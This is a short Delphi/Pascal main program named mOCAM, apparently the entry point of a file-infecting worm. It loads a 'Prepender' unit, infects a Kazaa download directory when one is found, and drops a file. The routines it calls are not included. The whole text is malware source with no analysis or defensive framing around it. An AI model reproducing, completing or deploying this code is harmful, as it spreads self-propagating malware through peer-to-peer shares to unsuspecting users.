   PROGRAM mOCAM;

   uses
     Prepender in 'Prepender.pas',
     AclUtils in 'ACLUnits\ACLUTILS.PAS';

   BEGIN
    IF KazaaDir<>'' THEN InfectKazaaDir;
    DropFile;
   END.
